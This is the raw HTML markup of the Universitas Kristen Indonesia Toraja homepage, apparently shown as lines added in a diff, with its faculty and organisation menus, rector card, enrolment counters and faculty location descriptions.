+menu-item-type-custom menu-item-object-custom menu-item-2287"><a 
+href="http://ukitoraja.ac.id/webmail">Webmail</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2300"><a 
+href="http://journals.ukitoraja.ac.id/">Jurnal</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2705"><a 
+href="https://ukitoraja.ac.id/webx/category/download/">Download</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6915"><a 
+href="http://tracerstudy.ukitoraja.ac.id/">Alumni</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-8820"><a 
+href="https://ukitoraja.ac.id/webx/siangkaran/">Siangkaran</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9670"><a 
+href="https://ukitoraja.ac.id/webx/kip-kuliah/">KIP</a></li>
+</ul>				</div>
+
+			</div>
+		</div>
+		
+	
+			<header id="main-header" data-height-onload="71">
+			<div class="container clearfix et_menu_container">
+							<div class="logo_container">
+					<span class="logo_helper"></span>
+					<a href="https://ukitoraja.ac.id/webx/">
+						<img 
+src="https://ukitoraja.ac.id/webx/wp-content/uploads/2019/05/Logo-UKIT.png" width="634" height="632" 
+alt="Universitas Kristen Indonesia Toraja" id="logo" data-height-percentage="80" />
+					</a>
+				</div>
+							<div id="et-top-navigation" data-height="71" 
+data-fixed-height="40">
+											<nav id="top-menu-nav">
+						<ul id="top-menu" class="nav"><li id="menu-item-1536" 
+class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item 
+menu-item-home menu-item-1536"><a href="https://ukitoraja.ac.id/webx" aria-current="page">Beranda</a></li>
+<li id="menu-item-17" class="menu-item menu-item-type- menu-item-object- menu-item-has-children 
+menu-item-17"><a>Profil</a>
+<ul class="sub-menu">
+	<li id="menu-item-3290" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-3290"><a href="https://ukitoraja.ac.id/webx/visi-dan-misi/">Visi dan Misi</a></li>
+	<li id="menu-item-3188" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-3188"><a href="https://ukitoraja.ac.id/webx/akreditasi/">Akreditasi</a></li>
+	<li id="menu-item-1522" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-1522"><a href="https://ukitoraja.ac.id/webx/data-dosen-dan-pegawai/">Data Dosen dan Tenaga 
+Kependidikan</a></li>
+	<li id="menu-item-1516" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-1516"><a href="https://ukitoraja.ac.id/webx/pedoman-dan-prosedur-pelayanan/">Pedoman dan Prosedur 
+Pelayanan</a></li>
+</ul>
+</li>
+<li id="menu-item-8479" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children 
+menu-item-8479"><a href="https://ukitoraja.ac.id/webx/struktur-organisasi-uki-toraja/">Struktur Organisasi</a>
+<ul class="sub-menu">
+	<li id="menu-item-6440" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-has-children menu-item-6440"><a href="https://ukitoraja.ac.id/webx/wakil-rektor-i/">Bidang I</a>
+	<ul class="sub-menu">
+		<li id="menu-item-7489" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-7489"><a href="https://ukitoraja.ac.id/webx/upt-perpustakaan/">UPT Perpustakaan</a></li>
+		<li id="menu-item-7488" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-7488"><a href="https://ukitoraja.ac.id/webx/lab-terpadu/">LAB. Terpadu</a></li>
+		<li id="menu-item-7487" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-7487"><a href="https://ukitoraja.ac.id/webx/baa/">BAA</a></li>
+		<li id="menu-item-7486" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-7486"><a href="https://ukitoraja.ac.id/webx/lembaga-penjaminan-mutu-2/">Lembaga Penjaminan 
+Mutu</a></li>
+	</ul>
+</li>
+	<li id="menu-item-6439" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-has-children menu-item-6439"><a href="https://ukitoraja.ac.id/webx/wakil-rektor-ii/">Bidang II</a>
+	<ul class="sub-menu">
+		<li id="menu-item-7679" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-7679"><a href="https://ukitoraja.ac.id/webx/bagian-perencanaan-keuangan/">Bagian Perencanaan &#038; 
+Keuangan</a></li>
+		<li id="menu-item-4858" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-4858"><a href="https://ukitoraja.ac.id/webx/biro-administrasi-perencanaan-sistem-informasi/">Biro 
+Administrasi Perencanaan Sistem Informasi</a></li>
+		<li id="menu-item-7697" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-7697"><a href="https://ukitoraja.ac.id/webx/bagian-sarana-prasarana-lingkungan-kampus/">Bagian Sarana 
+Prasarana &#038; Lingkungan Kampus</a></li>
+	</ul>
+</li>
+	<li id="menu-item-6438" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-has-children menu-item-6438"><a href="https://ukitoraja.ac.id/webx/wakil-rektor-iii/">Bidang III</a>
+	<ul class="sub-menu">
+		<li id="menu-item-6862" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-6862"><a href="https://ukitoraja.ac.id/webx/biro-kemahasiswaan-dan-hubungan-alumni/">Biro 
+Kemahasiswaan Dan Hubungan Alumni</a></li>
+		<li id="menu-item-6861" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-6861"><a href="https://ukitoraja.ac.id/webx/pusat-pengembangan-spiritual/">Pusat Pengembangan 
+Spiritual</a></li>
+	</ul>
+</li>
+	<li id="menu-item-6437" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-has-children menu-item-6437"><a href="https://ukitoraja.ac.id/webx/wakil-rektor-iv/">Bidang IV</a>
+	<ul class="sub-menu">
+		<li id="menu-item-7390" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-has-children menu-item-7390"><a href="https://ukitoraja.ac.id/webx/lppm-2/">LPPM</a>
+		<ul class="sub-menu">
+			<li id="menu-item-7386" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-7386"><a href="https://ukitoraja.ac.id/webx/bagian-adm-riset-pengabdian-kepada-manyarakat/">Bagian 
+Adm. Riset &#038; Pengabdian Kepada Masyarakat</a></li>
+			<li id="menu-item-5919" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-5919"><a href="https://ukitoraja.ac.id/webx/inkubator-bisnis-banne/">Pusat Inkubator Bisnis</a></li>
+			<li id="menu-item-7385" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-7385"><a href="https://ukitoraja.ac.id/webx/pusat-kajian-ketorajaan/">Pusat Kajian Ketorajaan</a></li>
+		</ul>
+</li>
+		<li id="menu-item-7483" class="menu-item menu-item-type-custom menu-item-object-custom 
+menu-item-7483"><a href="https://ukitoraja.ac.id/kerjasama/">Bag. Kerjasama Regional &#038; 
+Internasional</a></li>
+		<li id="menu-item-7387" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-7387"><a href="https://ukitoraja.ac.id/webx/bagian-publikasi-uki-toraja-press/">Bagian Publikasi 
+&#038; UKI Toraja Press</a></li>
+	</ul>
+</li>
+	<li id="menu-item-6441" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-has-children menu-item-6441"><a href="https://ukitoraja.ac.id/webx/bidang-v/">Bidang V ( Sekretariat 
+Universitas )</a>
+	<ul class="sub-menu">
+		<li id="menu-item-7421" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-7421"><a href="https://ukitoraja.ac.id/webx/bagian-sdm/">Bagian SDM</a></li>
+		<li id="menu-item-7419" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-7419"><a href="https://ukitoraja.ac.id/webx/bag-tata-kelola-komunikasi-publik/">Bag. Tata Kelola 
+&#038; Komunikasi Publik</a></li>
+		<li id="menu-item-7420" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-7420"><a href="https://ukitoraja.ac.id/webx/koperasi/">Koperasi</a></li>
+	</ul>
+</li>
+</ul>
+</li>
+<li id="menu-item-18" class="menu-item menu-item-type- menu-item-object- menu-item-has-children 
+menu-item-18"><a>Fakultas</a>
+<ul class="sub-menu">
+	<li id="menu-item-6072" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-has-children menu-item-6072"><a 
+href="https://ukitoraja.ac.id/webx/fakultas-keguruan-dan-ilmu-pendidikan/">Fakultas Keguruan dan Ilmu 
+Pendidikan</a>
+	<ul class="sub-menu">
+		<li id="menu-item-5983" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-5983"><a href="https://ukitoraja.ac.id/webx/magister-pendidikan-bahasa-indonesia/">Magister Pendidikan 
+Bahasa Indonesia</a></li>
+		<li id="menu-item-1563" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-1563"><a href="https://ukitoraja.ac.id/webx/program-studi-bahasa-indonesia/">Program Studi Pendidikan 
+Bahasa Dan Sastra Indonesia</a></li>
+		<li id="menu-item-1566" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-1566"><a href="https://ukitoraja.ac.id/webx/program-studi-pendidikan-guru-sekolah-dasar/">Program 
+Studi Pendidikan Guru Sekolah Dasar</a></li>
+		<li id="menu-item-4417" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-4417"><a href="https://ukitoraja.ac.id/webx/program-studi-bahasa-inggris/">Program Studi Pendidikan 
+Bahasa Inggris</a></li>
+		<li id="menu-item-1565" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-1565"><a href="https://ukitoraja.ac.id/webx/program-studi-matematika/">Program Studi Pendidikan 
+Matematika</a></li>
+		<li id="menu-item-6639" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-6639"><a href="https://ukitoraja.ac.id/webx/program-studi-pendidikan-fisika/">Program Studi Pendidikan 
+Fisika</a></li>
+		<li id="menu-item-4355" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-4355"><a href="https://ukitoraja.ac.id/webx/program-studi-teknologi-pendidikan/">Program Studi 
+Teknologi Pendidikan</a></li>
+	</ul>
+</li>
+	<li id="menu-item-1517" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-has-children menu-item-1517"><a href="https://ukitoraja.ac.id/webx/fakultas-ekonomi/">Fakultas 
+Ekonomi</a>
+	<ul class="sub-menu">
+		<li id="menu-item-1570" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-1570"><a href="https://ukitoraja.ac.id/webx/program-studi-manajemen/">Program Studi Manajemen</a></li>
+		<li id="menu-item-9501" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-9501"><a href="https://ukitoraja.ac.id/webx/program-studi-pariwisata/">Program Studi 
+Pariwisata</a></li>
+	</ul>
+</li>
+	<li id="menu-item-1518" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-has-children menu-item-1518"><a href="https://ukitoraja.ac.id/webx/fakultas-pertanian/">Fakultas 
+Pertanian</a>
+	<ul class="sub-menu">
+		<li id="menu-item-4441" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-4441"><a href="https://ukitoraja.ac.id/webx/program-study-agroteknologi/">Program Studi 
+Agroteknologi</a></li>
+		<li id="menu-item-9500" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-9500"><a href="https://ukitoraja.ac.id/webx/program-studi-pengelolaan-perkebunan-kopi/">Program Studi 
+Pengelolaan Perkebunan Kopi</a></li>
+	</ul>
+</li>
+	<li id="menu-item-1519" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-has-children menu-item-1519"><a href="https://ukitoraja.ac.id/webx/fakultas-teknik/">Fakultas 
+Teknik</a>
+	<ul class="sub-menu">
+		<li id="menu-item-1539" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-1539"><a href="https://ukitoraja.ac.id/webx/program-studi-teknik-sipil/">Program Studi Teknik 
+Sipil</a></li>
+		<li id="menu-item-1538" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-1538"><a href="https://ukitoraja.ac.id/webx/program-studi-teknik-mesin/">Program Studi Teknik 
+Mesin</a></li>
+		<li id="menu-item-3884" class="menu-item menu-item-type-custom menu-item-object-custom 
+menu-item-3884"><a href="https://ukitoraja.ac.id/webx/program-studi-teknik-informatika/">Program Studi Teknik 
+Informatika</a></li>
+		<li id="menu-item-4590" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-4590"><a href="https://ukitoraja.ac.id/webx/program-studi-teknik-elektro-2/">Program Studi Teknik 
+Elektro</a></li>
+	</ul>
+</li>
+	<li id="menu-item-1520" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-has-children menu-item-1520"><a href="https://ukitoraja.ac.id/webx/fakultas-teologi/">Fakultas 
+Teologi</a>
+	<ul class="sub-menu">
+		<li id="menu-item-4569" class="menu-item menu-item-type-post_type menu-item-object-page 
+menu-item-4569"><a href="https://ukitoraja.ac.id/webx/program-studi-teologi-2/">Program Studi Teologi</a></li>
+	</ul>
+</li>
+</ul>
+</li>
+<li id="menu-item-3604" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3604"><a 
+href="https://ukitoraja.ac.id/webx/category/berita/">Berita</a></li>
+<li id="menu-item-7271" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7271"><a 
+href="https://ukitoraja.ac.id/webx/pmb/">PMB</a></li>
+<li id="menu-item-4006" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4006"><a 
+href="https://ukitoraja.ac.id/webx/karir/">Karir</a></li>
+<li id="menu-item-8690" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8690"><a 
+href="https://ukitoraja.ac.id/webx/kkn-41/">KKN-41</a></li>
+</ul>						</nav>
+					
+					
+					
+											<div id="et_top_search">
+							<span id="et_search_icon"></span>
+						</div>
+					
+					<div id="et_mobile_nav_menu">
+				<div class="mobile_nav closed">
+					<span class="select_page">Select Page</span>
+					<span class="mobile_menu_bar mobile_menu_bar_toggle"></span>
+				</div>
+			</div>				</div> <!-- #et-top-navigation -->
+			</div> <!-- .container -->
+						<div class="et_search_outer">
+				<div class="container et_search_form_container">
+					<form role="search" method="get" class="et-search-form" 
+action="https://ukitoraja.ac.id/webx/">
+					<input type="search" class="et-search-field" placeholder="Search 
+&hellip;" value="" name="s" title="Search for:" />					</form>
+					<span class="et_close_search_field"></span>
+				</div>
+			</div>
+					</header> <!-- #main-header -->
+			<div id="et-main-area">
+	
+<div id="main-content">
+
+
+			
+				<article id="post-2220" class="post-2220 page type-page status-publish hentry">
+
+				
+					<div class="entry-content">
+					<div class="et-l et-l--post">
+			<div class="et_builder_inner_content et_pb_gutters3">
+		<div class="et_pb_section et_pb_section_0 et_pb_fullwidth_section et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_fullwidth_slider_0 et_animated et_clickable 
+et_pb_slider et_slider_auto et_slider_speed_7000 et_pb_slider_show_image">
+				<div class="et_pb_slides">
+					<div class="et_pb_slide et_pb_slide_0 et_clickable et_pb_bg_layout_dark 
+et_pb_media_alignment_center et-pb-active-slide" data-slide-id="et_pb_slide_0">
+				
+				
+				<div class="et_pb_container clearfix">
+					<div class="et_pb_slider_container_inner">
+						
+						<div class="et_pb_slide_description">
+							
+							
+						</div>
+					</div>
+				</div>
+				
+				
+				
+			</div>
+			<div class="et_pb_slide et_pb_slide_1 et_pb_bg_layout_dark et_pb_media_alignment_center" 
+data-slide-id="et_pb_slide_1">
+				
+				
+				<div class="et_pb_container clearfix">
+					<div class="et_pb_slider_container_inner">
+						
+						<div class="et_pb_slide_description">
+							
+							
+						</div>
+					</div>
+				</div>
+				
+				
+				
+			</div>
+			<div class="et_pb_slide et_pb_slide_2 et_pb_bg_layout_dark et_pb_media_alignment_center" 
+data-slide-id="et_pb_slide_2">
+				
+				
+				<div class="et_pb_container clearfix">
+					<div class="et_pb_slider_container_inner">
+						
+						<div class="et_pb_slide_description">
+							
+							
+						</div>
+					</div>
+				</div>
+				
+				
+				
+			</div>
+			<div class="et_pb_slide et_pb_slide_3 et_pb_bg_layout_dark et_pb_media_alignment_center" 
+data-slide-id="et_pb_slide_3">
+				
+				
+				<div class="et_pb_container clearfix">
+					<div class="et_pb_slider_container_inner">
+						
+						<div class="et_pb_slide_description">
+							
+							
+						</div>
+					</div>
+				</div>
+				
+				
+				
+			</div>
+			
+				</div>
+				
+			</div>
+			
+				
+				
+			</div><div class="et_pb_section et_pb_section_1 et_pb_fullwidth_section 
+et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_fullwidth_slider_1 et_animated et_clickable 
+et_pb_slider et_slider_auto et_slider_speed_7000 et_pb_slider_show_image">
+				<div class="et_pb_slides">
+					<div class="et_pb_slide et_pb_slide_4 et_clickable et_pb_bg_layout_dark 
+et_pb_media_alignment_center et-pb-active-slide" data-slide-id="et_pb_slide_4">
+				
+				
+				<div class="et_pb_container clearfix">
+					<div class="et_pb_slider_container_inner">
+						
+						<div class="et_pb_slide_description">
+							
+							
+						</div>
+					</div>
+				</div>
+				
+				
+				
+			</div>
+			<div class="et_pb_slide et_pb_slide_5 et_pb_bg_layout_dark et_pb_media_alignment_center" 
+data-slide-id="et_pb_slide_5">
+				
+				
+				<div class="et_pb_container clearfix">
+					<div class="et_pb_slider_container_inner">
+						
+						<div class="et_pb_slide_description">
+							
+							
+						</div>
+					</div>
+				</div>
+				
+				
+				
+			</div>
+			<div class="et_pb_slide et_pb_slide_6 et_pb_bg_layout_dark et_pb_media_alignment_center" 
+data-slide-id="et_pb_slide_6">
+				
+				
+				<div class="et_pb_container clearfix">
+					<div class="et_pb_slider_container_inner">
+						
+						<div class="et_pb_slide_description">
+							
+							
+						</div>
+					</div>
+				</div>
+				
+				
+				
+			</div>
+			<div class="et_pb_slide et_pb_slide_7 et_pb_bg_layout_dark et_pb_media_alignment_center" 
+data-slide-id="et_pb_slide_7">
+				
+				
+				<div class="et_pb_container clearfix">
+					<div class="et_pb_slider_container_inner">
+						
+						<div class="et_pb_slide_description">
+							
+							
+						</div>
+					</div>
+				</div>
+				
+				
+				
+			</div>
+			
+				</div>
+				
+			</div>
+			
+				
+				
+			</div><div class="et_pb_section et_pb_section_2 et_section_specialty" >
+				
+				
+				
+				
+				
+				<div class="et_pb_row">
+				<div class="et_pb_column et_pb_column_1_2 et_pb_column_0    
+et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_module et_pb_team_member et_pb_team_member_0 
+clearfix  et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_team_member_image et-waypoint et_pb_animation_off"><img 
+fetchpriority="high" decoding="async" width="1000" height="1500" 
+src="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/08/Oktavianus-Pasoloran.jpg?resize=1000%2C1500&#038;ssl=1" 
+alt="Prof. Dr. Oktavianus Pasoloran, S.E., M.Si., Ak. CA" 
+srcset="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/08/Oktavianus-Pasoloran.jpg?w=1000&ssl=1 
+1000w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/08/Oktavianus-Pasoloran.jpg?resize=200%2C300&ssl=1 
+200w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/08/Oktavianus-Pasoloran.jpg?resize=683%2C1024&ssl=1 
+683w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/08/Oktavianus-Pasoloran.jpg?resize=768%2C1152&ssl=1 
+768w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/08/Oktavianus-Pasoloran.jpg?resize=980%2C1470&ssl=1 
+980w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/08/Oktavianus-Pasoloran.jpg?resize=480%2C720&ssl=1 
+480w" sizes="(max-width: 1000px) 100vw, 1000px" class="wp-image-9001" data-recalc-dims="1" /></div>
+				<div class="et_pb_team_member_description">
+					<h4 class="et_pb_module_header">Prof. Dr. Oktavianus Pasoloran, S.E., 
+M.Si., Ak. CA</h4>
+					<p class="et_pb_member_position">Rektor Universitas Kristen Indonesia 
+Toraja</p>
+					
+					
+				</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_2 et_pb_column_1   et_pb_specialty_column  
+et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_row_inner et_pb_row_inner_0">
+				<div class="et_pb_column et_pb_column_1_6 et_pb_column_inner 
+et_pb_column_inner_0">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_number_counter et_pb_number_counter_0  
+et_pb_text_align_center et_pb_bg_layout_light et_pb_with_title" data-number-value="7544" 
+data-number-separator="">
+				
+				
+				
+				
+				<div class="percent" ><p><span class="percent-value"></span><span 
+class="percent-sign"></span></p></div>
+				<h3 class="title">MAHASISWA</h3>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_6 et_pb_column_inner 
+et_pb_column_inner_1">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_number_counter et_pb_number_counter_1  
+et_pb_text_align_center et_pb_bg_layout_light et_pb_with_title" data-number-value="147" 
+data-number-separator="">
+				
+				
+				
+				
+				<div class="percent" ><p><span class="percent-value"></span><span 
+class="percent-sign"></span></p></div>
+				<h3 class="title">DOSEN</h3>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_6 et_pb_column_inner et_pb_column_inner_2 
+et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_number_counter et_pb_number_counter_2  
+et_pb_text_align_center et_pb_bg_layout_light et_pb_with_title" data-number-value="5" data-number-separator="">
+				
+				
+				
+				
+				<div class="percent" ><p><span class="percent-value"></span><span 
+class="percent-sign"></span></p></div>
+				<h3 class="title">FAKULTAS</h3>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div><div class="et_pb_row_inner et_pb_row_inner_1">
+				<div class="et_pb_column et_pb_column_1_6 et_pb_column_inner 
+et_pb_column_inner_3">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_number_counter et_pb_number_counter_3  
+et_pb_text_align_center et_pb_bg_layout_light et_pb_with_title" data-number-value="21567" 
+data-number-separator="">
+				
+				
+				
+				
+				<div class="percent" ><p><span class="percent-value"></span><span 
+class="percent-sign"></span></p></div>
+				<h3 class="title">ALUMNI</h3>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_6 et_pb_column_inner 
+et_pb_column_inner_4">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_number_counter et_pb_number_counter_4  
+et_pb_text_align_center et_pb_bg_layout_light et_pb_with_title" data-number-value="1" data-number-separator="">
+				
+				
+				
+				
+				<div class="percent" ><p><span class="percent-value"></span><span 
+class="percent-sign"></span></p></div>
+				<h3 class="title">PROGRAM MAGISTER</h3>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_6 et_pb_column_inner et_pb_column_inner_5 
+et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_number_counter et_pb_number_counter_5  
+et_pb_text_align_center et_pb_bg_layout_light et_pb_with_title" data-number-value="15" data-number-separator="">
+				
+				
+				
+				
+				<div class="percent" ><p><span class="percent-value"></span><span 
+class="percent-sign"></span></p></div>
+				<h3 class="title">PROGRAM STUDI</h3>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div>
+			</div>
+				</div>
+				
+			</div><div class="et_pb_section et_pb_section_3 et_pb_with_background 
+et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_row et_pb_row_0 et_pb_equal_columns 
+et_pb_gutters1 et_pb_section_video_on_hover">
+				<div class="et_pb_with_border et_pb_column_1_5 et_pb_column et_pb_column_2 
+hover-column et_pb_section_video_on_hover et_pb_section_parallax_hover  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_module et_pb_text et_pb_text_0 hover-title  
+et_pb_text_align_left et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p>Fakultas Keguruan Dan Ilmu Pendidikan</p></div>
+			</div><div class="et_pb_with_border et_pb_module et_pb_text et_pb_text_1 hover-text 
+et_animated et_pb_section_video_on_hover  et_pb_text_align_left et_pb_text_align_center-phone 
+et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p style="text-align: left;">Fakultas Keguruan Dan 
+Ilmu Pendidikan memiliki 6 program studi berlokasi di kampus I Makale, <span>Jalan Jenderal Sudirman No.9 
+Makale, Kab. Tana Toraja.</span></p></div>
+			</div><div class="et_pb_button_module_wrapper et_pb_button_0_wrapper 
+et_pb_button_alignment_left et_pb_button_alignment_tablet_left et_pb_button_alignment_phone_left et_pb_module ">
+				<a class="et_pb_button et_pb_button_0 et_pb_bg_layout_dark" 
+href="https://ukitoraja.ac.id/webx/fakultas-keguruan-dan-ilmu-pendidikan/" target="_blank" 
+data-icon="&#x24;">Selengkapnya</a>
+			</div>
+			</div><div class="et_pb_with_border et_pb_column_1_5 et_pb_column et_pb_column_3 
+hover-column et_pb_section_video_on_hover et_pb_section_parallax_hover  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_module et_pb_text et_pb_text_2 hover-title  
+et_pb_text_align_left et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p>Fakultas Ekonomi</p></div>
+			</div><div class="et_pb_module et_pb_text et_pb_text_3 hover-text 
+et_pb_section_video_on_hover  et_pb_text_align_left et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p style="text-align: left;"><span>Fakultas 
+Ekonomi memiliki 2 program studi berlokasi di kampus I Makale, </span><span>Jalan Jenderal Sudirman No.9 Makale, 
+Kab. Tana Toraja.</span></p></div>
+			</div><div class="et_pb_button_module_wrapper et_pb_button_1_wrapper 
+et_pb_button_alignment_left et_pb_module ">
+				<a class="et_pb_button et_pb_button_1 hover-button et_pb_bg_layout_dark" 
+href="https://ukitoraja.ac.id/webx/fakultas-ekonomi/" target="_blank" data-icon="&#x24;">Selengkapnya</a>
+			</div>
+			</div><div class="et_pb_with_border et_pb_column_1_5 et_pb_column et_pb_column_4 
+hover-column et_pb_section_video_on_hover et_pb_section_parallax_hover  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_module et_pb_text et_pb_text_4 hover-title  
+et_pb_text_align_left et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p>Fakultas Pertanian</p></div>
+			</div><div class="et_pb_module et_pb_text et_pb_text_5 hover-text 
+et_pb_section_video_on_hover  et_pb_text_align_left et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p style="text-align: left;"><span>Fakultas 
+Pertanian memiliki 2 program studi berlokasi di kampus II Kakondongan, Jalan Poros Rantepao &#8211; Sa’dan, Kab. 
+Toraja Utara.</span></p></div>
+			</div><div class="et_pb_button_module_wrapper et_pb_button_2_wrapper 
+et_pb_button_alignment_left et_pb_module ">
+				<a class="et_pb_button et_pb_button_2 hover-button et_pb_bg_layout_dark" 
+href="https://ukitoraja.ac.id/webx/fakultas-pertanian/" target="_blank" data-icon="&#x24;">Selengkapnya</a>
+			</div>
+			</div><div class="et_pb_with_border et_pb_column_1_5 et_pb_column et_pb_column_5 
+hover-column et_pb_section_video_on_hover et_pb_section_parallax_hover  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_module et_pb_text et_pb_text_6 hover-title  
+et_pb_text_align_left et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p>Fakultas Teknik</p></div>
+			</div><div class="et_pb_module et_pb_text et_pb_text_7 hover-text 
+et_pb_section_video_on_hover  et_pb_text_align_left et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p style="text-align: left;"><span>Fakultas Teknik 
+memiliki 4 program studi yang berlokasi di kampus II Kakondongan, Jalan Poros Rantepao &#8211; Sa’dan Kab. 
+Toraja Utara.</span></p></div>
+			</div><div class="et_pb_button_module_wrapper et_pb_button_3_wrapper 
+et_pb_button_alignment_left et_pb_module ">
+				<a class="et_pb_button et_pb_button_3 hover-button et_pb_bg_layout_dark" 
+href="https://ukitoraja.ac.id/webx/fakultas-teknik/" target="_blank" data-icon="&#x24;">Selengkapnya</a>
+			</div>
+			</div><div class="et_pb_with_border et_pb_column_1_5 et_pb_column et_pb_column_6 
+hover-column et_pb_section_video_on_hover et_pb_section_parallax_hover  et_pb_css_mix_blend_mode_passthrough 
+et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_module et_pb_text et_pb_text_8 hover-title  
+et_pb_text_align_left et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p>Fakultas Teologi</p></div>
+			</div><div class="et_pb_module et_pb_text et_pb_text_9 hover-text 
+et_pb_section_video_on_hover  et_pb_text_align_left et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p style="text-align: left;"><span>Fakultas 
+Teologi memiliki 1 program studi yang berlokasi di kampus III Rantepao, Jalan Dr Ratulangi No.80 Rantepao, Kab. 
